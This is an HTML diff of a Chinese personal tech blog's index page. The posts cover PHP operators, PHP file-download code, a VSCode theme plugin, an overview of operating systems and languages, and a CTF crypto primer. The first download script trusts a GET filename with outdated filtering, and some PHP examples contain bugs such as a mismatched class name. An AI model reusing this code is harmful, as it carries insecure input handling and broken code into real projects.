@@ -1,0 +1,616 @@
+<!doctype html>
+<html lang="zh"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"><meta><title>神社的储物间</title><link rel="manifest" href="/manifest.json"><meta name="application-name" content="神社的储物间"><meta name="msapplication-TileImage" content="Shrine-Repository"><meta name="apple-mobile-web-app-capable" content="yes"><meta name="apple-mobile-web-app-title" content="神社的储物间"><meta name="apple-mobile-web-app-status-bar-style" content="default"><meta property="og:type" content="blog"><meta property="og:title" content="神社的储物间"><meta property="og:url" content="http://example.com/"><meta property="og:site_name" content="神社的储物间"><meta property="og:locale" content="zh_CN"><meta property="og:image" content="http://example.com/img/og_image.png"><meta property="article:author" content="xeonds"><meta property="twitter:card" content="summary"><meta property="twitter:image:src" content="http://example.com/img/og_image.png"><script type="application/ld+json">{"@context":"https://schema.org","@type":"BlogPosting","mainEntityOfPage":{"@type":"WebPage","@id":"http://example.com"},"headline":"神社的储物间","image":["http://example.com/img/og_image.png"],"author":{"@type":"Person","name":"xeonds"},"publisher":{"@type":"Organization","name":"神社的储物间","logo":{"@type":"ImageObject","url":null}},"description":""}</script><link rel="alternate" href="/atom.xml" title="神社的储物间" type="application/atom+xml"><link rel="icon" href="/Shrine-Repository"><link rel="stylesheet" href="https://use.fontawesome.com/releases/v6.0.0/css/all.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/highlight.js@9.12.0/styles/atom-one-light.css"><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Oxanium:wght@300;400;600&amp;family=Roboto+Mono"><link rel="stylesheet" href="/css/cyberpunk.css"><style>body>.footer,body>.navbar,body>.section{opacity:0}</style><!--!--><!--!--><!--!--><!--!--><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/cookieconsent@3.1.1/build/cookieconsent.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/lightgallery@1.10.0/dist/css/lightgallery.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/justifiedGallery@3.8.1/dist/css/justifiedGallery.min.css"><!--!--><!--!--><!--!--><!--!--><style>.pace{-webkit-pointer-events:none;pointer-events:none;-webkit-user-select:none;-moz-user-select:none;user-select:none}.pace-inactive{display:none}.pace .pace-progress{background:#3273dc;position:fixed;z-index:2000;top:0;right:100%;width:100%;height:2px}</style><script src="https://cdn.jsdelivr.net/npm/pace-js@1.2.4/pace.min.js"></script><!--!--><!--!--><!-- hexo injector head_end start --><script>
+  (function () {
+      function switchTab() {
+          if (!location.hash) {
+            return;
+          }
+
+          const $tabMenu = document.querySelector(`a[href="${location.hash}"]`);
+          if (!$tabMenu) {
+            return;
+          }
+
+          const $tabMenuContainer = $tabMenu.parentElement.parentElement;
+          Array.from($tabMenuContainer.children).forEach($menu => $menu.classList.remove('is-active'));
+          Array.from($tabMenuContainer.querySelectorAll('a'))
+              .map($menu => document.getElementById($menu.getAttribute("href").substring(1)))
+              .forEach($content => $content.classList.add('is-hidden'));
+
+          if ($tabMenu) {
+              $tabMenu.parentElement.classList.add('is-active');
+          }
+          const $activeTab = document.querySelector(location.hash);
+          if ($activeTab) {
+              $activeTab.classList.remove('is-hidden');
+          }
+      }
+      switchTab();
+      window.addEventListener('hashchange', switchTab, false);
+  })();
+  </script><!-- hexo injector head_end end --><meta name="generator" content="Hexo 6.3.0"></head><body class="is-2-column"><nav class="navbar navbar-main"><div class="container navbar-container"><div class="navbar-brand justify-content-center"><a class="navbar-item navbar-logo" href="/">神社的储物间</a></div><div class="navbar-menu"><div class="navbar-start"><a class="navbar-item" href="/">Home</a><a class="navbar-item" href="/archives">Archives</a><a class="navbar-item" href="/categories">Categories</a><a class="navbar-item" href="/tags">Tags</a><a class="navbar-item" href="/about">About</a></div><div class="navbar-end"><a class="navbar-item" target="_blank" rel="noopener" title="My GitHub" href="https://github.com/xeonds"><i class="fab fa-github"></i></a><a class="navbar-item search" title="搜索" href="javascript:;"><i class="fas fa-search"></i></a></div></div></div></nav><section class="section"><div class="container"><div class="columns"><div class="column order-2 column-main is-8-tablet is-8-desktop is-8-widescreen"><div class="card"><article class="card-content article" role="article"><div class="article-meta is-size-7 is-uppercase level is-mobile"><div class="level-left"><span class="level-item"><time dateTime="2021-07-18T15:56:48.000Z" title="2021/7/18 23:56:48">2021-07-18</time>发表</span><span class="level-item"><time dateTime="2022-10-12T04:05:00.658Z" title="2022/10/12 12:05:00">2022-10-12</time>更新</span><span class="level-item"> xeonds </span><span class="level-item">3 分钟读完 (大约404个字)</span></div></div><h1 class="title is-3 is-size-4-mobile"><a class="link-muted" href="/2021/07/18/PHP%E4%B8%AD%E4%B8%89%E7%A7%8D%E9%AC%BC%E7%95%9C%E7%AC%A6%E5%8F%B7%E7%9A%84%E7%94%A8%E6%B3%95/">PHP中三种鬼畜符号的用法</a></h1><div class="content"><h2><span id="x3dgt的用法">&#x3D;&gt;的用法</span></h2><p>在php中数组默认键名是整数，也可以自己定义任意字符键名（最好是有实际意义），如：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$css=array(&#x27;style&#x27;=&gt;&#x27;0&#x27;，‘color’=&gt;‘green‘)；</span><br><span class="line">　则$css[&#x27;style&#x27;]==&#x27;0&#x27;，$css[&#x27;color&#x27;]==&#x27;green&#x27;。</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h2><span id="-gt的用法">-&gt;的用法</span></h2><p>用来引用对象的成员（属性与方法）。相当于其他语言中的“.”。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">  $arr=[&#x27;a&#x27;=&gt;123,&#x27;b&#x27;=&gt;456];//数组初始化</span><br><span class="line">  echo $arr[&#x27;a&#x27;];//数组引用</span><br><span class="line">  print_r($arr);//查看数组</span><br><span class="line">  class A&#123;</span><br><span class="line">    public $a=123;</span><br><span class="line">    public $b=456;</span><br><span class="line">  &#125;</span><br><span class="line">  $obj=new A();</span><br><span class="line">  echo $obj-&gt;a;//对象引用</span><br><span class="line">  print_r($obj);//查看对象</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>输出结果：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">123Array(</span><br><span class="line">    [a] =&gt; 123</span><br><span class="line">    [b] =&gt; 456)</span><br><span class="line">123A Object(</span><br><span class="line">    [a] =&gt; 123</span><br><span class="line">    [b] =&gt; 456)</span><br></pre></td></tr></table></figure>
+
+<h2><span id="的用法">::的用法</span></h2><p>双冒号操作符即作用域限定操作符Scope Resolution Operator可以访问静态、const和类中重写的属性与方法。</p>
+<p>（1）Program List：用变量在类定义外部访问</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">class Fruit &#123;</span><br><span class="line">    const CONST_VALUE = &#x27;Fruit Color&#x27;;</span><br><span class="line">&#125;</span><br><span class="line">  </span><br><span class="line">$classname = &#x27;Fruit&#x27;;</span><br><span class="line">echo $classname::CONST_VALUE; // As of PHP 5.3.0</span><br><span class="line">echo Fruit::CONST_VALUE;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>（2）Program List：在类定义外部使用::</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">class Fruit &#123;</span><br><span class="line">    const CONST_VALUE = &#x27;Fruit Color&#x27;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class Apple extends Fruit</span><br><span class="line">&#123;</span><br><span class="line">    public static $color = &#x27;Red&#x27;;</span><br><span class="line">    public static function doubleColon() &#123;</span><br><span class="line">        echo parent::CONST_VALUE . &quot;\n&quot;;</span><br><span class="line">        echo self::$color . &quot;\n&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">Apple::doubleColon();</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>（3）Program List：调用parent方法</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">class Fruit</span><br><span class="line">&#123;</span><br><span class="line">    protected function showColor() &#123;</span><br><span class="line">        echo &quot;Fruit::showColor()\n&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">  </span><br><span class="line">class Apple extends Fruit</span><br><span class="line">&#123;</span><br><span class="line">    // Override parent&#x27;s definition</span><br><span class="line">    public function showColor()</span><br><span class="line">    &#123;</span><br><span class="line">        // But still call the parent function</span><br><span class="line">        parent::showColor();</span><br><span class="line">        echo &quot;Apple::showColor()\n&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">$apple = new Apple();</span><br><span class="line">$apple-&gt;showColor();</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>（4）Program List：使用作用域限定符</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">    class Apple</span><br><span class="line">    &#123;</span><br><span class="line">        public function showColor()</span><br><span class="line">        &#123;</span><br><span class="line">            return $this-&gt;color;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    class Banana12     &#123;</span><br><span class="line">        public $color;</span><br><span class="line">        public function __construct()</span><br><span class="line">        &#123;</span><br><span class="line">            $this-&gt;color = &quot;Banana is yellow&quot;;</span><br><span class="line">        &#125;</span><br><span class="line"> </span><br><span class="line">        public function GetColor()</span><br><span class="line">        &#123;</span><br><span class="line">            return Apple::showColor();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    $banana = new Banana;</span><br><span class="line">    echo $banana-&gt;GetColor();</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>（5）Program List：调用基类的方法</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">class Fruit</span><br><span class="line">&#123;</span><br><span class="line">    static function color()</span><br><span class="line">    &#123;</span><br><span class="line">       return &quot;color&quot;;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    static function showColor()</span><br><span class="line">    &#123;</span><br><span class="line">        echo &quot;show &quot; . self::color();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">class Apple extends Fruit</span><br><span class="line">&#123;</span><br><span class="line">    static function color()</span><br><span class="line">    &#123;</span><br><span class="line">        return &quot;red&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">Apple::showColor();</span><br><span class="line">// output is &quot;show color&quot;!</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+</div></article></div><div class="card"><article class="card-content article" role="article"><div class="article-meta is-size-7 is-uppercase level is-mobile"><div class="level-left"><span class="level-item"><time dateTime="2021-07-18T14:56:13.000Z" title="2021/7/18 22:56:13">2021-07-18</time>发表</span><span class="level-item"><time dateTime="2022-10-12T04:04:54.673Z" title="2022/10/12 12:04:54">2022-10-12</time>更新</span><span class="level-item"> xeonds </span><span class="level-item">2 分钟读完 (大约311个字)</span></div></div><h1 class="title is-3 is-size-4-mobile"><a class="link-muted" href="/2021/07/18/PHP%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E4%BB%A3%E7%A0%81/">PHP文件下载代码</a></h1><div class="content"><h2><span id="其一">其一</span></h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"> </span><br><span class="line">$filename = $_GET[&#x27;filename&#x27;];</span><br><span class="line"> </span><br><span class="line">// 修改这一行设置你的文件下载目录</span><br><span class="line">$download_path = &quot;ficheros/&quot;;</span><br><span class="line"> </span><br><span class="line">// 不能下载上一层目录的文件</span><br><span class="line">if(eregi(&quot;\.\.&quot;, $filename)) die(&quot;抱歉，你不能下载该文件！&quot;);</span><br><span class="line">$file = str_replace(&quot;..&quot;, &quot;&quot;, $filename);</span><br><span class="line"> </span><br><span class="line">// 包含 .ht 的文件不能下载</span><br><span class="line">if(eregi(&quot;\.ht.+&quot;, $filename)) die(&quot;抱歉，你不能下载该文件！&quot;);</span><br><span class="line"> </span><br><span class="line">// 创建文件下载路径</span><br><span class="line">$file = &quot;$download_path$file&quot;;</span><br><span class="line"> </span><br><span class="line">// 判断文件是否存在</span><br><span class="line">if(!file_exists($file)) die(&quot;抱歉，文件不存在！&quot;);</span><br><span class="line"> </span><br><span class="line">//  文件类型，作为头部发送给浏览器</span><br><span class="line">$type = filetype($file);</span><br><span class="line"> </span><br><span class="line">// 获取时间和日期</span><br><span class="line">$today = date(&quot;F j, Y, g:i a&quot;);</span><br><span class="line">$time = time();</span><br><span class="line"> </span><br><span class="line">// 发送文件头部</span><br><span class="line">header(&quot;Content-type: $type&quot;);</span><br><span class="line">header(&quot;Content-Disposition: attachment;filename=$filename&quot;);</span><br><span class="line">header(&quot;Content-Transfer-Encoding: binary&quot;);</span><br><span class="line">header(&#x27;Pragma: no-cache&#x27;);</span><br><span class="line">header(&#x27;Expires: 0&#x27;);</span><br><span class="line">// 发送文件内容</span><br><span class="line">set_time_limit(0);</span><br><span class="line">readfile($file);</span><br><span class="line"> </span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<h2><span id="其二">其二</span></h2><ul>
+<li>其实这算html常规方式（</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;button&gt;</span><br><span class="line">    &lt;a href = &quot;http://localhost/down.zip&quot;&gt;</span><br><span class="line">    下载文件</span><br><span class="line">&lt;/button&gt;</span><br></pre></td></tr></table></figure>
+
+<h2><span id="其三">其三</span></h2><p>传递参数：</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">button</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span> = <span class="string">&quot;http://localhost?f=&#x27;down&#x27;&quot;</span>&gt;</span></span><br><span class="line">    下载文件</span><br><span class="line"><span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>查找文件并挑战到下载链接：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$down</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;f&#x27;</span>];   <span class="comment">//获取文件参数</span></span><br><span class="line"><span class="variable">$filename</span> = <span class="variable">$down</span>.<span class="string">&#x27;.zip&#x27;</span>; <span class="comment">//获取文件名称</span></span><br><span class="line"><span class="variable">$dir</span> =<span class="string">&quot;down/&quot;</span>;  <span class="comment">//相对于网站根目录的下载目录路径</span></span><br><span class="line"><span class="variable">$down_host</span> = <span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_HOST&#x27;</span>].<span class="string">&#x27;/&#x27;</span>; <span class="comment">//当前域名</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//判断如果文件存在,则跳转到下载路径</span></span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">file_exists</span>(<span class="keyword">__DIR__</span>.<span class="string">&#x27;/&#x27;</span>.<span class="variable">$dir</span>.<span class="variable">$filename</span>))&#123;</span><br><span class="line">    <span class="title function_ invoke__">header</span>(<span class="string">&#x27;location:http://&#x27;</span>.<span class="variable">$down_host</span>.<span class="variable">$dir</span>.<span class="variable">$filename</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">header</span>(<span class="string">&#x27;HTTP/1.1 404 Not Found&#x27;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+</div></article></div><div class="card"><article class="card-content article" role="article"><div class="article-meta is-size-7 is-uppercase level is-mobile"><div class="level-left"><span class="level-item"><time dateTime="2021-07-18T14:42:25.000Z" title="2021/7/18 22:42:25">2021-07-18</time>发表</span><span class="level-item"><time dateTime="2022-10-12T04:13:24.401Z" title="2022/10/12 12:13:24">2022-10-12</time>更新</span><span class="level-item"> xeonds </span><span class="level-item">1 分钟读完 (大约194个字)</span></div></div><h1 class="title is-3 is-size-4-mobile"><a class="link-muted" href="/2021/07/18/VScode%E6%B7%BB%E5%8A%A0%E6%AF%9B%E7%8E%BB%E7%92%83%E6%95%88%E6%9E%9C/">VScode添加毛玻璃效果</a></h1><div class="content"><p>很简单。就是有些步骤有点坑，不过自己试试基本就没问题了（</p>
+<h2><span id="安装vibrnancy">安装Vibrnancy</span></h2><p>直接在VScode插件市场里搜，安装图里这个就好了。</p>
+<p><img src="/file/img/vf-1.png" alt="就这个"></p>
+<h2><span id="配置">配置</span></h2><p>安装完后别急着关。点击卸载旁边的小齿轮，进入扩展设置。</p>
+<p><img src="/file/img/vf-2.png"></p>
+<p>设置里搜vibrancy，回车。按照图片里的设置即可。</p>
+<p><img src="/file/img/vf-3.png"></p>
+<p>完成后，右下角会弹出确认。一路确认即可。</p>
+<p><img src="/file/img/vf-4.png"></p>
+<p>完事儿。</p>
+<h2><span id="后记">后记</span></h2><ul>
+<li><p>需要注意的一点是，这个插件每次更新VSCode就要重新运行Reload Vibrancy。</p>
+</li>
+<li><p>如果不起作用，重新启动一下VSCode，应该就好了。</p>
+</li>
+</ul>
+</div></article></div><div class="card"><article class="card-content article" role="article"><div class="article-meta is-size-7 is-uppercase level is-mobile"><div class="level-left"><span class="level-item"><time dateTime="2021-07-09T17:08:19.000Z" title="2021/7/10 01:08:19">2021-07-10</time>发表</span><span class="level-item"><time dateTime="2022-10-12T04:07:32.615Z" title="2022/10/12 12:07:32">2022-10-12</time>更新</span><span class="level-item"> xeonds </span><span class="level-item">8 分钟读完 (大约1261个字)</span></div></div><h1 class="title is-3 is-size-4-mobile"><a class="link-muted" href="/2021/07/10/%E8%81%8A%E8%81%8A%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E4%B8%8E%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80/">聊聊操作系统与编程语言</a></h1><div class="content"><p>今天就大概和大家聊下计算机相关的一些东西。比较多，也比较杂。</p>
+<h3><span id="操作系统">操作系统</span></h3><p>目前相对常见的操作系统有两种。</p>
+<ul>
+<li><p>Microsoft Windows</p>
+</li>
+<li><p>UNIX及其衍生系统</p>
+</li>
+</ul>
+<p>第一类通常没啥好说的。因为我们生活里最常用的就是这个系统。</p>
+<p>另一类系统对我们而言比较陌生。但其实生活里不少地方都有它们的身影。UNIX及其衍生版本涵盖的极其广泛，比较著名的有GNU&#x2F;Linux，Android Open Source Project(AOSP，即安卓系统)，MacOS，iOS等等，下面分条列述。</p>
+<h4><span id="gnux2flinux"></span></h4><p>GNU&#x2F;Linux是一个类UNIX操作系统。它应用极其广泛，Android就是基于它开发的操作系统。它广泛应用在开发，以及生产环境中。世界上很多服务器都选用Linux作为操作系统，主要是基于下面这几点。</p>
+<ul>
+<li>开放源代码，安全可靠，且便于定制</li>
+<li>图形界面安装时可选，因此节约了很多服务器资源，利于系统稳定和长久运行</li>
+<li>环境配置非常方便，开发和服务器搭建效率极高</li>
+<li>大多数发型版本免费，免去了高额的软件授权费用</li>
+</ul>
+<h4><span id="macos-amp-ios">MacOS &amp; iOS</span></h4><p>这两个系统都是基于UNIX开发的类UNIX操作系统。生活里很常见，就不多介绍了。</p>
+<h4><span id="android">Android</span></h4><p>这个系统是基于GNU&#x2F;Linux开发的。生活里也很常见，应用广泛。包括手机，平板，智能手表，各种终端，都在用Android系统。和Linux一样，Android系统也可以免费使用。不过Android中包含的GMS则需要谷歌的授权才能使用。</p>
+<p>操作系统基本就是这样了。最后再介绍一下UNIX系统本身，它是由贝尔实验室的Kenneth Thompson和Dennis Ritchie所开发。K.Thompson于1969年在小型计算机上开发UNIX系统，而1973年，DennisRitchie开发出C语言，用来改写原来用汇编语言编写的UNIX。由此诞生了C语言和UNIX系统。</p>
+<p>UNIX系统是一个分时系统。此前，只有面向批处理作业的操作系统，这样的系统对于需要立即得到响应的用户来说是太慢了。所以，UNIX一经发布，立马获得了很高的关注。</p>
+<p>不过后来因为反垄断，贝尔实验室被拆了（摊</p>
+<h3><span id="编程语言">编程语言</span></h3><p>先来点简单的介绍。</p>
+<ul>
+<li><p>低级语言：主要包括<code>机器语言</code>以及<code>汇编语言</code>。</p>
+</li>
+<li><p>高级语言：比较老的有<strong>Fortran</strong>，<strong>BASIC</strong>，<strong>Pascal</strong>。被称为<strong>现代程序语言革命的起点</strong>的C语言，是美国贝尔实验室的Dennis M.Ritchie在1970年写出来的。另一类比较新的，是面向对象的编程语言，包括Java，Python，C#等。</p>
+</li>
+</ul>
+<p>下面分条列述。</p>
+<ul>
+<li><p>C语言：是一门面向过程的、抽象化的通用程序设计语言，广泛应用于底层开发。C语言的优良特性包括：不需要任何运行环境支持便能运行；提供了许多低级处理的功能，但仍然保持着跨平台的特性；运行效率极高；有最好的编译器等。</p>
+</li>
+<li><p>Python：是一门面向对象的脚本语言。优点有：简单、易学、用途广泛、速度快、免费、开源、高层语言、可移植性、解释性、面向对象、可扩展性、可扩充性、可嵌入性、丰富的库、规范的代码、高级动态编程、做科学计算优点多。</p>
+</li>
+<li><p>Java：一门纯粹的面向对象语言。Java 是由 Sun Microsystems 公司于 1995 年 5 月推出的高级程序设计语言。Java 可运行于多个平台，如 Windows, Mac OS 及其他多种 UNIX 版本的系统。</p>
+</li>
+</ul>
+<p>剩下的，请自行百度（</p>
+<h3><span id="小结">小结</span></h3><p>好像什么都谈到了，又好像什么都没说（笑）。</p>
+<p>计算机的学习，在现如今是很方便的。只要你想学，在互联网上，总有大把大把的教程供你学习。而且，不仅限于计算机，所有技能的学习成本，都因为互联网，而大大降低了。</p>
+<p>所以，在这个时代，掌握信息获取的能力，是很关键的。有了获取信息的能力，在互联网上，你就能获得一切你想要的资源，因而能更方便地提升个人能力。</p>
+<p><strong>用人话说，就是：你不会百度一下吗（</strong></p>
+</div></article></div><div class="card"><article class="card-content article" role="article"><div class="article-meta is-size-7 is-uppercase level is-mobile"><div class="level-left"><span class="level-item"><time dateTime="2021-07-08T11:26:31.000Z" title="2021/7/8 19:26:31">2021-07-08</time>发表</span><span class="level-item"><time dateTime="2022-10-12T04:04:08.248Z" title="2022/10/12 12:04:08">2022-10-12</time>更新</span><span class="level-item"> XDU </span><span class="level-item">7 分钟读完 (大约1111个字)</span></div></div><h1 class="title is-3 is-size-4-mobile"><a class="link-muted" href="/2021/07/08/Crypto%E5%85%A5%E9%97%A8%E6%8C%87%E5%8C%97/">Crypto入门指北</a></h1><div class="content"><h1><span id="crypto入门指北">Crypto入门指北</span></h1><h2><span id="关于密码学">关于密码学</span></h2><p>顾名思义就是研究加密的学科。比如要在Alice与Bob两人通信过程中，在有Eve窃听的情况下，依然保证消息不泄露，这就需要Alice用一个加密密钥（类似于开锁的钥匙）对信息加密，而Bob将收到的信息用解密密钥解密，这样Eve就无法得知通信内容。而凯撒密码就是十分著名的一种加密方式，将字母移位，从而达到加密的目的，凯撒密码属于古典密码，在平台的Classic Crypto分类中就有许多这样的密码。但是它们的安全性都基于对加密算法的保护，一旦加密算法暴露，哪怕没有密钥，也能够进行解密。因此，现代密码学要求在加密算法公开的情况下，只要不知道密钥，就无法对消息进行解密。这样的话，仅需要保护一个不算长的密钥即可保护一段信息；即使密钥泄露，换个密钥就能继续用同一个加密算法加密。所以，密码学就是要寻找一个在不知道密钥情况下无法破解的算法。因此，下面这些题目，都会有一个用python写的加密脚本，这些都是有漏洞的加密方式，你需要从中找出漏洞，并且在没有密钥的情况下恢复明文。</p>
+<h2><span id="密码学需要什么基础知识">密码学需要什么基础知识</span></h2><ul>
+<li>数学基础： 密码学是数学的一个应用学科，最早的公钥密码算法RSA就是基于数论的，因此学习密码学通常还需要从数论开始学起，公钥密码往后发展的过程中，也逐步用到了线性代数与抽象代数的内容，那些东西由于过难在本次新生赛不会涉及，因此请先从数论开始（除了用于防大佬新生ak的Easy RSA有用到线性代数的复杂知识，想要钻研的这题的新生请慎重）。其次，最早不是基于数学的块密码，在发展的过程中，也被运用数学的语言来描述，从而更能够更清晰的找到攻击方法。因此，学习密码学会涉及到大量的数学知识，欢迎对数学感兴趣（至少不讨厌）的同学来钻研学习</li>
+<li>编程基础： 现代密码学比古典密码复杂许多，它的加密解密算法不是人能够口算或者笔算出来的东西，因此也需要编程。而密码学由于经常要用到特别大的数字，远超c和c++的long long int的上限，因此一般使用python编写程序。python是一个较接近自然语言的编程语言，因此容易上手，灵活运用搜索引擎以及网上一些教程很容易学会。</li>
+<li>英语基础： 你有可能会遇到一些需要阅读纯英文文章才能解决的题目，需要有一定的耐心才能看明白。</li>
+</ul>
+<h2><span id="密码学需要哪些工具">密码学需要哪些工具</span></h2><ul>
+<li>python</li>
+<li>两个用的挺多的python库：pycryptodome，gmpy2（网上均有安装方法，使用方法也有，也可直接查文档）</li>
+<li>（sagemath）对初学者来说用处不大</li>
+</ul>
+<h2><span id="如何学习密码学">如何学习密码学</span></h2><ul>
+<li>善用搜索引擎</li>
+<li>在ctfwiki的crypto分区寻找一些crypto的基础知识</li>
+</ul>
+<h2><span id="当我在做题时遇到困难怎么办">当我在做题时遇到困难怎么办</span></h2><ul>
+<li>先去各大搜索引擎轮番搜一遍</li>
+<li>阅读《提问的智慧》</li>
+<li>寻找管理员里那个密码fw寻求帮助</li>
+</ul>
+<p>当然，就算做题没遇到困难，只要对密码学感兴趣，也欢迎去找那个密码fw闲聊.<del>并教教他密码学，他可菜了。</del></p>
+<p>crypto是个比较小众的方向，但也相当有趣。会有很硬核的数学让人想放弃，但坚持下来慢慢搞，一定会有很大收获。</p>
